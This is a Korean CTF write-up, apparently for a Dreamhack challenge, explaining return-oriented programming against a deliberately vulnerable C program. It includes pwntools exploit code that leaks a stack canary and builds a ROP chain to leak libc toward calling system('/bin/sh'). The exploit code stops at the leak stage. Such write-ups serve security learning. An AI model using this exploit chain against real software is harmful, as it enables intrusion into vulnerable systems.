# ☘️ rop    
**Return Oriented Programming: return gadget을 사용하여 복잡한 실행 흐름을 구현하는 기법**    
system함수가 PLT에 포함X, ASLR이 걸린 환경에서 system 함수를 사용하려면 libc의 주소를 찾고 그 주소로부터 system 함수의 offset을 이용하여 함수의 주소 계산   

## 📄 Code Analysis
```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```
buf의 크기가 0x30byte이지만 read함수가 최대 0x100byte를 입력받기 때문에 stack buffer overflow 발생   

**checksec으로 보호 기법 확인**
```bash
$ checksec rop
[*] '/home/dreamhack/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Canary와 NX가 적용되어 있으며, PIE가 꺼져 있어 바이너리 베이스 주소는 고정이다.
하지만 libc는 ASLR의 영향을 받아 실행할 때마다 주소가 바뀌므로, libc leak이 필요

## 🗡️ Exploit   
**1. Canary 우회**
```python
from pwn import *   

p = remote("host3.dreamhack.games", 9526)  
e = ELF("./rop")                            # rop 바이너리의 심볼/plt/got 정보 읽기
libc = ELF("./libc.so.6")                   # libc 파일의 함수 오프셋, "/bin/sh" 위치 정보 읽기

offset = b'A' * 0x39                        # canary leak을 위한 입력
p.sendafter(b'Buf: ', offset)               # 첫 번째 Buf: 에 A * 0x39 전송
p.recvuntil(offset)                         # 내가 보낸 A * 0x39가 다시 출력될 때까지 받음
cnry = u64(b'\x00' + p.recvn(7))            # canary의 앞 1바이트는 \x00 이라 가정하고 뒤 7바이트를 받아 8바이트 정수로 복원
```
buf의 크기는 0x30이고, canary 앞까지의 패딩을 포함해 0x39바이트를 출력하게 만들어
printf("%s")가 canary의 일부까지 이어서 출력하도록 유도

**2. system함수의 주소 계산**
1) 개념 정리
- PLT: 함수의 실제 주소로 가기 위한 점프 코드, PLT는 GOT를 참고해서 진짜 함수 주소로 점프해줌
- GOT: 전역 offset table, read@got에는 실행중인 프로세스에서의 read 실제 주소가 저장됨
- libc: C표준 라이브러리, ASLR 때문에 libc가 메모리의 어디에 올라가는지는 매 실행마다 바뀜
        system 주소는 바로 알 수 없고 libc안에서 각 함수 사이의 상대적 거리(offset)은 고정
- system: libc안에 들어있는 함수, 문자열을 받아서 리눅스 명령처럼 실행, system("/bin/sh")

이 문제에서는 puts@plt를 이용해 read@got에 저장된 read의 실제 주소를 출력하고,
그 값을 기반으로 libc base를 구한 뒤 system과 "/bin/sh"의 실제 주소를 계산한다.

2) ROPgadget을 이용해 pop rdi, pop rsi 주소를 확인
```bash
ROPgadget --binary ./rop | grep "pop rdi"
ROPgadget --binary ./rop | grep "pop rsi"
```
출력 결과를 기반으로 libc주소를 얻기 위한 payload구성
```python
payload = b'A' * 0x38                       # buf부터 canary 직전까지 채움
payload += p64(cnry)                        # leak한 canary를 원래 값 그대로 넣어서 stack smashing 방지
payload += b'B' * 0x8                       # saved rbp 자리 더미값
payload += p64(pop_rdi)                     # 다음 값을 rdi에 넣기 위한 가젯
payload += p64(e.got['read'])               # rdi = read@got, 즉 read 실제 주소가 저장된 GOT 엔트리 주소
payload += p64(e.plt['puts'])               # puts(read@got) 실행해서 read 실제 주소 leak
payload += p64(e.symbols['main'])           # leak 후 다시 main으로 돌아가서 입력 기회를 다시 얻음

p.sendafter(b'Buf: ', payload)              # 두 번째 Buf: 에 leak용 ROP payload 전송
```

   
